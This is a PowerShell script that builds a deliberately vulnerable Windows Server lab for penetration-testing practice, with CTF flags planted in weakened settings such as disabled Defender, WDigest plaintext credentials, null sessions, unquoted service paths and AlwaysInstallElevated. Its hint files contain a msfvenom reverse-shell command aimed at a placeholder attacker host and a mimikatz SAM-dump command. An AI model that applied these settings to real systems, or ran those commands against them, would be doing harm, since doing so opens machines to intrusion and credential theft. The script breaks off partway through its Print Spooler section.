# Windows Server 2019 Vulnerable Lab Configuration Script v5
# WARNING: FOR ISOLATED LAB ENVIRONMENT ONLY - NEVER USE IN PRODUCTION
# This script intentionally creates security vulnerabilities and CTF flags for penetration testing practice

param(
    [string]$LabPassword = "Password123!",
    [string]$NetworkPrinter = "192.168.148.105",
    [switch]$GenerateFlagReport,
    # Best-effort upgrade of the in-box OpenSSH (7.7 on RTM Server 2019) to the
    # Win32-OpenSSH 8.1+ GitHub release so the SSH banner reports
    # "OpenSSH_for_Windows_8.1" to match the student walkthrough. Requires
    # outbound internet during setup; falls back to the in-box capability on
    # failure. Leave OFF for fully offline builds.
    [switch]$UpgradeOpenSSH
)

Write-Host "==========================================" -ForegroundColor Red
Write-Host "VULNERABLE LAB CONFIGURATION SCRIPT v5" -ForegroundColor Red
Write-Host "FOR EDUCATIONAL PURPOSES ONLY" -ForegroundColor Red
Write-Host "NEVER USE IN PRODUCTION ENVIRONMENTS" -ForegroundColor Red
Write-Host "==========================================" -ForegroundColor Red
Write-Host ""
$confirm = Read-Host "Type 'VULNERABLE' to confirm this is for an isolated lab"
if ($confirm -ne "VULNERABLE") { exit }

# Initialize flag tracking
$global:FlagList = @()
$global:FlagCounter = 1

# Pokemon list for deterministic flag generation
$PokemonList = @(
    "PIKACHU", "CHARIZARD", "BULBASAUR", "SQUIRTLE", "MEWTWO",
    "GENGAR", "DRAGONITE", "SNORLAX", "ALAKAZAM", "MACHAMP",
    "GYARADOS", "LAPRAS", "EEVEE", "VAPOREON", "JOLTEON",
    "FLAREON", "ARTICUNO", "ZAPDOS", "MOLTRES", "DRATINI",
    "MEOWTH", "PSYDUCK", "ARCANINE", "POLIWAG", "ABRA",
    "MACHOP", "BELLSPROUT", "TENTACOOL", "GEODUDE", "PONYTA",
    "SLOWPOKE", "MAGNEMITE", "FARFETCH", "DODUO", "SEEL",
    "GRIMER", "SHELLDER", "GASTLY", "ONIX", "DROWZEE",
    "KRABBY", "VOLTORB", "EXEGGCUTE", "CUBONE", "HITMONLEE",
    "LICKITUNG", "KOFFING", "RHYHORN", "CHANSEY", "TANGELA",
    "KANGASKHAN", "HORSEA", "GOLDEEN", "STARYU", "SCYTHER",
    "JYNX", "ELECTABUZZ", "MAGMAR", "PINSIR", "TAUROS",
    "MAGIKARP", "DITTO", "UMBREON", "ESPEON", "PORYGON",
    "OMANYTE", "KABUTO", "AERODACTYL", "CYNDAQUIL", "TOTODILE",
    "CHIKORITA", "TYPHLOSION", "FERALIGATR", "MEGANIUM", "FURRET"
)

# Function to generate deterministic flag based on position
function New-CTFFlag {
    param(
        [string]$Location,
        [string]$Description,
        [int]$Points,
        [string]$Difficulty,
        [string]$Technique
    )
    
    # Use deterministic selection based on counter
    $pokemonIndex = ($global:FlagCounter - 1) % $PokemonList.Count
    $pokemon = $PokemonList[$pokemonIndex]
    
    # Generate deterministic 8-digit number using hash of counter and hostname
    $seed = "SERVER$($global:FlagCounter)$(hostname)"
    $hash = [System.Security.Cryptography.SHA256]::Create()
    $hashBytes = $hash.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seed))
    $hashInt = [BitConverter]::ToUInt32($hashBytes, 0)
    $digits = "{0:D8}" -f ($hashInt % 100000000)
    
    $flag = "FLAG{$pokemon$digits}"
    
    $global:FlagList += [PSCustomObject]@{
        FlagID = "{0:D3}" -f $global:FlagCounter
        Flag = $flag
        Location = $Location
        Description = $Description
        Points = $Points
        Difficulty = $Difficulty
        Technique = $Technique
        Hostname = hostname
    }
    
    $global:FlagCounter++
    return $flag
}

# Function to create weak users with embedded flags
function Create-WeakUsers {
    Write-Host "Creating vulnerable user accounts with flags..." -ForegroundColor Yellow
    
    # User with flag in description
    $flag1 = New-CTFFlag -Location "User Description" -Description "Hidden in user description" -Points 10 -Difficulty "Easy" -Technique "User enumeration"
    
    $users = @(
        @{Name="overclock"; Password="Administrator2025!"; Groups=@("Administrators"); Description=$flag1},
        @{Name="user1"; Password="Password123!"; Groups=@("Users"); Description="Standard User"},
        @{Name="backup"; Password="Backupaccount123!"; Groups=@("Backup Operators"); Description="Backup Service Account"},
        @{Name="service"; Password="ServiceAccount123!"; Groups=@("Users"); Description="Service Account"},
        @{Name="test"; Password="TestAccount123!"; Groups=@("Users"); Description="Test Account"},
        @{Name="sqlservice"; Password="SQLservice2019"; Groups=@("Users"); Description="SQL Service Account"},
        @{Name="svc_print"; Password="PrintService123"; Groups=@("Users"); Description="Print Service Account"},
        @{Name="debugger"; Password="Debugger2025!"; Groups=@("Users"); Description="Debug Account for Development"}
    )
    
    foreach ($user in $users) {
        try {
            New-LocalUser -Name $user.Name -Password (ConvertTo-SecureString $user.Password -AsPlainText -Force) -Description $user.Description -PasswordNeverExpires -ErrorAction SilentlyContinue
            foreach ($group in $user.Groups) {
                Add-LocalGroupMember -Group $group -Member $user.Name -ErrorAction SilentlyContinue
            }
            Write-Host "  Created user: $($user.Name)" -ForegroundColor Green
        } catch {
            Write-Host "  User $($user.Name) already exists or error occurred" -ForegroundColor Gray
        }
    }
    
    # Create a user with flag as username (shortened to fit 20 char limit)
    $shortPokemon = @("PIKA", "MEW", "CHAR", "BULB", "SQUIR", "EEVEE", "DRAGO", "GENGAR")
    $pokemonIndex = ($global:FlagCounter - 1) % $shortPokemon.Count
    $selectedPokemon = $shortPokemon[$pokemonIndex]
    $randomNum = Get-Random -Minimum 1000 -Maximum 9999
    $flagUserShort = "FLAG{$selectedPokemon$randomNum}"  # e.g., FLAG{PIKA1234} = 15 chars
    
    $flagUserDesc = New-CTFFlag -Location "Username" -Description "User account with flag as username: $flagUserShort" -Points 15 -Difficulty "Easy" -Technique "User enumeration"
    
    # Create the user with the shortened flag username
    New-LocalUser -Name $flagUserShort -Password (ConvertTo-SecureString "HiddenUser123!" -AsPlainText -Force) -Description "Can you find me?" -PasswordNeverExpires -ErrorAction SilentlyContinue
    Write-Host "  Created special user: $flagUserShort" -ForegroundColor Green
    
    # Store the actual username in the flag list for reporting
    $global:FlagList[-1].Flag = $flagUserShort  # Update the flag value to match the actual username
    
    # Enable built-in accounts
    Enable-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue
    Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString $LabPassword -AsPlainText -Force)
    Enable-LocalUser -Name "Guest" -ErrorAction SilentlyContinue
}

# Function to configure Mimikatz-friendly settings
function Configure-MimikatzVulnerabilities {
    Write-Host "Configuring Mimikatz-friendly vulnerabilities..." -ForegroundColor Yellow
    
    # Enable WDigest to store plaintext passwords in memory
    Write-Host "  Enabling WDigest for plaintext password storage..." -ForegroundColor Gray
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 1
    
    # Disable Credential Guard
    Write-Host "  Disabling Credential Guard..." -ForegroundColor Gray
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard") {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -ErrorAction SilentlyContinue
    }
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
    }
    
    # Disable LSA Protection (RunAsPPL)
    Write-Host "  Disabling LSA Protection..." -ForegroundColor Gray
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -Value 0 -ErrorAction SilentlyContinue
    
    # Enable storing credentials
    Write-Host "  Configuring credential storage settings..." -ForegroundColor Gray
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name DisableDomainCreds -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name TokenLeakDetectDelaySecs -Value 0 -ErrorAction SilentlyContinue
    
    # Increase cached logon count
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name CachedLogonsCount -Value 50 -ErrorAction SilentlyContinue
    
    # Create Mimikatz flag in LSASS memory (simulated)
    $mimikatzFlag = New-CTFFlag -Location "LSASS Memory" -Description "Dumped from LSASS process" -Points 45 -Difficulty "Hard" -Technique "Mimikatz credential dumping"
    
    # Store flag in registry where it would appear in memory dumps
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "SecretFlag" -Value $mimikatzFlag -Force
    
    # Create a scheduled task that keeps credentials in memory
    $credentialScript = @"
`$password = ConvertTo-SecureString "$LabPassword" -AsPlainText -Force
`$credential = New-Object System.Management.Automation.PSCredential("Administrator", `$password)
while (`$true) {
    Start-Sleep -Seconds 300
    # Keep credential object in memory
}
"@
    $credentialScript | Out-File "C:\Windows\Temp\CredKeeper.ps1" -Force
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Windows\Temp\CredKeeper.ps1"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName "CredentialKeeper" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
    
    Write-Host "  Mimikatz vulnerabilities configured" -ForegroundColor Green
}

# Function to configure debug privileges
function Configure-DebugPrivileges {
    Write-Host "Configuring debug privilege vulnerabilities..." -ForegroundColor Yellow
    
    # Grant SeDebugPrivilege to non-admin users
    Write-Host "  Granting SeDebugPrivilege to users..." -ForegroundColor Gray
    
    # Export current security policy
    secedit /export /cfg C:\Windows\Temp\secpol.cfg /quiet
    
    # Read the file
    $secpol = Get-Content C:\Windows\Temp\secpol.cfg
    
    # Find and modify SeDebugPrivilege line
    $debugLine = $secpol | Where-Object { $_ -like "SeDebugPrivilege*" }
    if ($debugLine) {
        # Add users to debug privilege
        $newDebugLine = "SeDebugPrivilege = *S-1-5-32-544,*S-1-5-32-545,debugger"
        $secpol = $secpol -replace [regex]::Escape($debugLine), $newDebugLine
    } else {
        # Add the line if it doesn't exist
        $secpol += "SeDebugPrivilege = *S-1-5-32-544,*S-1-5-32-545,debugger"
    }
    
    # Write back and import
    $secpol | Out-File C:\Windows\Temp\secpol.cfg -Force
    secedit /configure /db C:\Windows\security\local.sdb /cfg C:\Windows\Temp\secpol.cfg /areas USER_RIGHTS /quiet
    
    # Create flag for debug privilege abuse
    $debugFlag = New-CTFFlag -Location "Debug Privileges" -Description "Abused SeDebugPrivilege" -Points 40 -Difficulty "Medium" -Technique "Debug privilege abuse"
    # Create the registry key first
    New-Item -Path "HKLM:\SOFTWARE" -Name "DebugFlags" -Force -ErrorAction SilentlyContinue | Out-Null
    # Then create the property
    New-ItemProperty -Path "HKLM:\SOFTWARE\DebugFlags" -Name "Flag" -Value $debugFlag -Force
    
    Write-Host "  Debug privileges configured" -ForegroundColor Green
}

# Function to create pass-the-hash scenarios
function Configure-PassTheHash {
    Write-Host "Configuring Pass-the-Hash vulnerabilities..." -ForegroundColor Yellow
    
    # Disable restricted admin mode for RDP
    Write-Host "  Disabling Restricted Admin mode..." -ForegroundColor Gray
    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
    
    # Enable NTLM authentication
    Write-Host "  Configuring NTLM settings..." -ForegroundColor Gray
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name NoLmHash -Value 0 -ErrorAction SilentlyContinue
    
    # Store NTLM hashes in a recoverable format
    $users = @("Administrator", "overclock", "backup")
    foreach ($user in $users) {
        # Force password change to ensure hashes are stored
        $password = switch($user) {
            "Administrator" { $LabPassword }
            "overclock" { "Administrator2025!" }
            "backup" { "Backupaccount123!" }
        }
        Set-LocalUser -Name $user -Password (ConvertTo-SecureString $password -AsPlainText -Force) -ErrorAction SilentlyContinue
    }
    
    # Create PTH flag
    $pthFlag = New-CTFFlag -Location "Pass-the-Hash" -Description "Successful PTH attack" -Points 50 -Difficulty "Hard" -Technique "Pass-the-Hash attack"
    
    # Store flag in location accessible after PTH
    $pthPath = "C:\Windows\System32\config\systemprofile\pth_success.txt"
    New-Item -Path (Split-Path $pthPath -Parent) -ItemType Directory -Force -ErrorAction SilentlyContinue
    $pthFlag | Out-File $pthPath -Force
    
    Write-Host "  Pass-the-Hash vulnerabilities configured" -ForegroundColor Green
}

# Function to disable security features
function Disable-SecurityFeatures {
    Write-Host "Disabling security features..." -ForegroundColor Yellow
    
    # Disable Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
    Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
    
    # Disable Windows Firewall
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    
    # Disable UAC
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
    
    # Disable Windows Defender Credential Guard
    if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard") {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -Name "LsaCfgFlags" -Value 0 -ErrorAction SilentlyContinue
    }
    
    Write-Host "  Security features disabled" -ForegroundColor Green
}

# Function to configure vulnerable RDP with flag
function Configure-VulnerableRDP {
    Write-Host "Configuring vulnerable RDP with flags..." -ForegroundColor Yellow
    
    # Enable RDP
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    
    # Disable NLA
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
    
    # Allow blank passwords
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name "LimitBlankPasswordUse" -Value 0
    
    # Remove account lockout policy
    net accounts /lockoutthreshold:0
    
    # Enable clipboard redirection
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "fDisableClip" -Value 0
    
    # Add flag in RDP certificate name
    $rdpFlag = New-CTFFlag -Location "RDP Certificate" -Description "Hidden in RDP certificate properties" -Points 20 -Difficulty "Medium" -Technique "RDP enumeration"
    New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "CertificateComment" -Value $rdpFlag -Force
    
    Write-Host "  RDP configured with vulnerabilities and flag" -ForegroundColor Green
}

# Function to configure vulnerable SMB shares with flags
function Configure-VulnerableSMB {
    Write-Host "Configuring vulnerable SMB shares with flags..." -ForegroundColor Yellow
    
    # Enable SMBv1
    Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -All -NoRestart -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB1 -Value 1
    
    # Create vulnerable shares with flags
    $shares = @(
        @{Name="Public"; Path="C:\Public"; FlagFile=$true; FlagDifficulty="Easy"; Points=10},
        @{Name="Data"; Path="C:\Data"; FlagFile=$false},
        @{Name="Backup"; Path="C:\Backup"; FlagFile=$true; FlagDifficulty="Medium"; Points=20},
        @{Name="IT"; Path="C:\IT"; FlagFile=$true; FlagDifficulty="Hard"; Points=30},
        @{Name="Finance"; Path="C:\Finance"; FlagFile=$false}
    )
    
    foreach ($share in $shares) {
        New-Item -Path $share.Path -ItemType Directory -Force -ErrorAction SilentlyContinue
        New-SmbShare -Name $share.Name -Path $share.Path -FullAccess "Everyone" -ErrorAction SilentlyContinue
        
        # Set NTFS permissions
        $acl = Get-Acl $share.Path
        $permission = "Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow"
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
        $acl.SetAccessRule($accessRule)
        Set-Acl $share.Path $acl
        
        # Place flags in some shares
        if ($share.FlagFile) {
            $flag = New-CTFFlag -Location "SMB Share: $($share.Name)" -Description "Found in $($share.Name) share" -Points $share.Points -Difficulty $share.FlagDifficulty -Technique "SMB enumeration"
            $flag | Out-File "$($share.Path)\flag.txt" -Force
        }
        
        Write-Host "  Created share: $($share.Name)" -ForegroundColor Green
    }
    
    # Plant sensitive files with embedded flags
    $passFlag = New-CTFFlag -Location "Password file" -Description "Embedded in passwords.txt" -Points 15 -Difficulty "Easy" -Technique "File search"
    "Administrator:$LabPassword`n$passFlag" | Out-File "C:\Public\passwords.txt"
    
    # Create SAM backup for mimikatz practice
    $samFlag = New-CTFFlag -Location "SAM Backup" -Description "Found in SAM backup file" -Points 45 -Difficulty "Hard" -Technique "SAM database extraction"
    @"
SAM Database Backup (for Mimikatz practice)
Created: $(Get-Date)
Flag: $samFlag
Use: mimikatz # lsadump::sam /system:system.hiv /sam:sam.hiv
"@ | Out-File "C:\Backup\sam_backup_info.txt"
    
    # Hidden flag in alternate data stream
    $adsFlag = New-CTFFlag -Location "Alternate Data Stream" -Description "Hidden in ADS of C:\Public\normal.txt" -Points 40 -Difficulty "Hard" -Technique "ADS discovery"
    "This is a normal file" | Out-File "C:\Public\normal.txt"
    # Use Set-Content for ADS instead of Out-File
    Set-Content -Path "C:\Public\normal.txt" -Stream "hidden" -Value $adsFlag
    
    # --- Enable anonymous / null-session enumeration (FLAGS 1 & 2) ---
    # The original script only set RestrictAnonymous + RestrictNullSessAccess,
    # which is NOT enough on Server 2019: rpcclient/enum4linux still get
    # NT_STATUS_ACCESS_DENIED and SAM/RID enumeration stays blocked. We must
    # also clear RestrictAnonymousSAM, set EveryoneIncludesAnonymous, expose the
    # SAMR/LSARPC pipes anonymously, and allow anonymous SID<->name translation.
    Write-Host "  Enabling null-session / anonymous enumeration..." -ForegroundColor Gray
    $lsa    = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
    $lanman = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"

    Set-ItemProperty -Path $lsa -Name "RestrictAnonymous"        -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $lsa -Name "RestrictAnonymousSAM"     -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $lsa -Name "EveryoneIncludesAnonymous" -Value 1 -Type DWord -Force

    Set-ItemProperty -Path $lanman -Name "RestrictNullSessAccess" -Value 0 -Type DWord -Force
    New-ItemProperty  -Path $lanman -Name "NullSessionPipes"  -PropertyType MultiString `
        -Value @("samr","lsarpc","netlogon","srvsvc","browser","wkssvc","spoolss") -Force | Out-Null
    New-ItemProperty  -Path $lanman -Name "NullSessionShares" -PropertyType MultiString `
        -Value @("IPC$") -Force | Out-Null

    # "Network access: Allow anonymous SID/Name translation" = Enabled
    # (needed for rpcclient lookupsids RID cycling + enum4linux SID resolution).
    try {
        secedit /export /cfg C:\Windows\Temp\nullsess.cfg /quiet
        $cfg = Get-Content C:\Windows\Temp\nullsess.cfg
        if ($cfg -match "LSAAnonymousNameLookup") {
            $cfg = $cfg -replace "LSAAnonymousNameLookup\s*=\s*\d", "LSAAnonymousNameLookup = 1"
        } else {
            $cfg = $cfg -replace "(\[System Access\])", "`$1`r`nLSAAnonymousNameLookup = 1"
        }
        $cfg | Out-File C:\Windows\Temp\nullsess.cfg -Force -Encoding unicode
        secedit /configure /db C:\Windows\security\local.sdb /cfg C:\Windows\Temp\nullsess.cfg /areas SECURITYPOLICY /quiet
    } catch {
        Write-Host "    Warning: could not set LSAAnonymousNameLookup: $_" -ForegroundColor Yellow
    }

    # Apply the LanmanServer changes without a full reboot.
    try { Restart-Service -Name LanmanServer -Force -ErrorAction Stop }
    catch { Write-Host "    LanmanServer restart deferred to final reboot." -ForegroundColor Gray }

    Write-Host "  Null-session enumeration enabled" -ForegroundColor Green
}

# Function to create multiple unquoted service paths
function Create-UnquotedServicePaths {
    Write-Host "Creating unquoted service path vulnerabilities with flags..." -ForegroundColor Yellow

    # --- Helper: build one genuinely-exploitable unquoted-path service ---------
    # The original script was broken two ways (see WINSERVER Flag Review):
    #   1. The flag was echoed in plaintext INTO scanner.bat, so a student could
    #      just `type` the file and win without exploiting anything.
    #   2. The service binPath was a .bat. The SCM can only launch an .exe, so the
    #      service could never start and the path could never be hijacked.
    #
    # Correct design:
    #   * binPath is UNQUOTED and ends in .exe (so `sc qc` shows the vuln and the
    #     SCM actually search-walks the path on start).
    #   * The legitimate target exe is intentionally absent -> the service is
    #     "broken" until hijacked (normal for this class of vuln).
    #   * An intermediate directory that sits earlier in the search order is made
    #     writable by BUILTIN\Users (SID S-1-5-32-545) -> a low-priv student can
    #     drop their payload .exe there.
    #   * The reward flag lives in a file readable ONLY by SYSTEM. The student's
    #     payload, executed as LocalSystem when the service starts, copies it to a
    #     world-readable location -> the flag is obtainable ONLY by exploiting.
    function New-UnquotedService {
        param(
            [string]$Name, [string]$DisplayName, [string]$Description,
            [string]$BaseDir,    # made user-writable; the hijack .exe drops HERE
            [string]$RealDir,    # subdir (with a space) holding the absent legit exe
            [string]$BinPath,    # UNQUOTED path to the (missing) legit .exe
            [string]$HijackExe,  # the earlier-search-order file a student plants in $BaseDir
            [string]$Flag, [string]$FlagBaseName
        )
        New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null
        New-Item -Path $RealDir -ItemType Directory -Force | Out-Null

        # The misconfiguration that makes the unquoted path exploitable: a
        # low-priv user can write into $BaseDir, which sits EARLIER in the SCM's
        # space-split search order than the real target in $RealDir. So a planted
        # $HijackExe in $BaseDir is launched (as LocalSystem) before the real exe.
        icacls "$BaseDir" /grant "*S-1-5-32-545:(OI)(CI)(M)" | Out-Null

        # Reward flag - SYSTEM-only readable, sitting next to the service so a
        # low-priv user can SEE the filename but cannot READ it without escalating.
        # (inheritance:r drops the inherited Users:Modify from $BaseDir above.)
        $flagFile = Join-Path $BaseDir $FlagBaseName
        $Flag | Out-File $flagFile -Encoding ascii -Force
        icacls "$flagFile" /inheritance:r /grant "*S-1-5-18:(R)" "*S-1-5-32-544:(R)" | Out-Null

        # Register the service with an UNQUOTED .exe binPath (no legit exe present).
        sc.exe create "$Name" binPath= "$BinPath" start= auto DisplayName= "$DisplayName" | Out-Null
        sc.exe config "$Name" obj= "LocalSystem" | Out-Null
        sc.exe description "$Name" "$Description" | Out-Null
        Write-Host "  Created unquoted service: $Name (hijack -> $HijackExe)" -ForegroundColor Green
    }

    # Service 1 - Basic unquoted path (Easy)
    $unquotedFlag1 = New-CTFFlag -Location "Unquoted Service Path" -Description "Vulnerable Scanner Service exploitation" -Points 25 -Difficulty "Easy" -Technique "Unquoted service path"
    New-UnquotedService -Name "VulnScanner" -DisplayName "Vulnerable Scanner Service" `
        -Description "Vulnerable Scanner Service - Check for unquoted paths" `
        -BaseDir "C:\Program Files\Vulnerable Scanner" `
        -RealDir "C:\Program Files\Vulnerable Scanner\Scanner Service" `
        -BinPath "C:\Program Files\Vulnerable Scanner\Scanner Service\scanner.exe" `
        -HijackExe "C:\Program Files\Vulnerable Scanner\Scanner.exe" `
        -Flag $unquotedFlag1 -FlagBaseName "scanner_flag.txt"

    # Service 2 - More complex path (Medium)
    $unquotedFlag2 = New-CTFFlag -Location "Unquoted Service Path 2" -Description "Common Application Service exploitation" -Points 30 -Difficulty "Medium" -Technique "Unquoted service path"
    New-UnquotedService -Name "CommonAppService" -DisplayName "Common Application Service" `
        -Description "Common Application Service - background maintenance" `
        -BaseDir "C:\Program Files\Common Application" `
        -RealDir "C:\Program Files\Common Application\System Tools" `
        -BinPath "C:\Program Files\Common Application\System Tools\app service.exe" `
        -HijackExe "C:\Program Files\Common Application\System.exe" `
        -Flag $unquotedFlag2 -FlagBaseName "commonapp_flag.txt"

    # Service 3 - Hidden in vendor path (Medium)
    $unquotedFlag3 = New-CTFFlag -Location "Unquoted Service Path 3" -Description "Vendor Update Service exploitation" -Points 35 -Difficulty "Medium" -Technique "Unquoted service path"
    New-UnquotedService -Name "VendorUpdater" -DisplayName "Vendor Update Service" `
        -Description "Vendor Update Service - checks for software updates" `
        -BaseDir "C:\Program Files (x86)\Vendor Software Suite" `
        -RealDir "C:\Program Files (x86)\Vendor Software Suite\Update Service" `
        -BinPath "C:\Program Files (x86)\Vendor Software Suite\Update Service\updater.exe" `
        -HijackExe "C:\Program Files (x86)\Vendor Software Suite\Update.exe" `
        -Flag $unquotedFlag3 -FlagBaseName "vendor_flag.txt"

    Write-Host "  Created 3 exploitable unquoted service path vulnerabilities with flags" -ForegroundColor Green
}

# FIXED Function to configure AlwaysInstallElevated
function Configure-AlwaysInstallElevated {
    Write-Host "Configuring AlwaysInstallElevated vulnerability with flag..." -ForegroundColor Yellow
    
    # ROOT CAUSE of the field failure ("Registry Key not found"):
    # the original used `Set-ItemProperty ... -PropertyType DWORD`, but
    # -PropertyType is NOT a parameter of Set-ItemProperty (it belongs to
    # New-ItemProperty). The call threw a parameter-binding error that the
    # try/catch swallowed, so the value was never written. Use New-ItemProperty.
    #
    # AlwaysInstallElevated requires the DWORD = 1 in BOTH HKLM and HKCU. A
    # logged-in student is a *different* user hive than whoever ran this script,
    # so we write HKLM once and then stamp HKCU for the current user, .DEFAULT,
    # and every local profile's hive (loading NTUSER.DAT where needed).
    $relPath = "SOFTWARE\Policies\Microsoft\Windows\Installer"

    function Set-AIE {
        param([string]$RegPath)
        New-Item -Path $RegPath -Force -ErrorAction SilentlyContinue | Out-Null
        New-ItemProperty -Path $RegPath -Name "AlwaysInstallElevated" -PropertyType DWord -Value 1 -Force -ErrorAction SilentlyContinue | Out-Null
    }

    try {
        # Machine-wide (HKLM) + current user (HKCU)
        Set-AIE "HKLM:\$relPath"
        Set-AIE "HKCU:\$relPath"

        # Every user hive (loaded + on-disk profiles) so it is set no matter
        # which lab account the student logs in as.
        if (-not (Get-PSDrive -Name HKU -ErrorAction SilentlyContinue)) {
            New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS -ErrorAction SilentlyContinue | Out-Null
        }
        Set-AIE "HKU:\.DEFAULT\$relPath"

        Get-CimInstance Win32_UserProfile -ErrorAction SilentlyContinue |
            Where-Object { -not $_.Special -and $_.LocalPath } | ForEach-Object {
                $sid    = $_.SID
                $ntuser = Join-Path $_.LocalPath 'NTUSER.DAT'
                $loaded = Test-Path "HKU:\$sid"
                if (-not $loaded -and (Test-Path $ntuser)) {
                    reg load "HKU\$sid" "$ntuser" 2>$null | Out-Null
                    $justLoaded = $true
                } else { $justLoaded = $false }
                if (Test-Path "HKU:\$sid") { Set-AIE "HKU:\$sid\$relPath" }
                if ($justLoaded) { [gc]::Collect(); Start-Sleep -Milliseconds 200; reg unload "HKU\$sid" 2>$null | Out-Null }
            }

        Write-Host "  AlwaysInstallElevated enabled (HKLM + all user hives)" -ForegroundColor Green
    } catch {
        Write-Host "  Warning: Could not fully configure AlwaysInstallElevated: $_" -ForegroundColor Yellow
    }
    
    # Create flag that will be accessible after MSI privilege escalation
    $msiFlag = New-CTFFlag -Location "AlwaysInstallElevated" -Description "MSI privilege escalation successful" -Points 40 -Difficulty "Medium" -Technique "AlwaysInstallElevated MSI"
    
    # Create a file only readable by SYSTEM that contains the flag
    $flagPath = "C:\Windows\System32\config\systemprofile\msi_flag.txt"
    $flagDir = Split-Path $flagPath -Parent
    
    # Create directory if it doesn't exist
    if (!(Test-Path $flagDir)) {
        New-Item -Path $flagDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    $msiFlag | Out-File $flagPath -Force
    
    # Create a sample MSI in Public folder for students to find
    $msiInfo = @"
AlwaysInstallElevated is enabled!
Generate malicious MSI with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi > shell.msi
Or use: msiexec /quiet /qn /i malicious.msi
Flag location hint: Check SYSTEM profile directory after escalation
"@
    $msiInfo | Out-File "C:\Public\msi_hint.txt"
    
    Write-Host "  AlwaysInstallElevated configured with flag" -ForegroundColor Green
}

# Function to configure Print Spooler vulnerabilities
function Configure-PrintSpoolerVulnerabilities {
    Write-Host "Configuring Print Spooler vulnerabilities with flags..." -ForegroundColor Yellow
    
    # Ensure Print Spooler is running
    Set-Service -Name "Spooler" -StartupType Automatic
    Start-Service -Name "Spooler" -ErrorAction SilentlyContinue
    
    # Enable Point and Print without warnings (CVE-2021-34527 related)
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Force | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnInstall" -Value 1 -PropertyType DWORD -Force
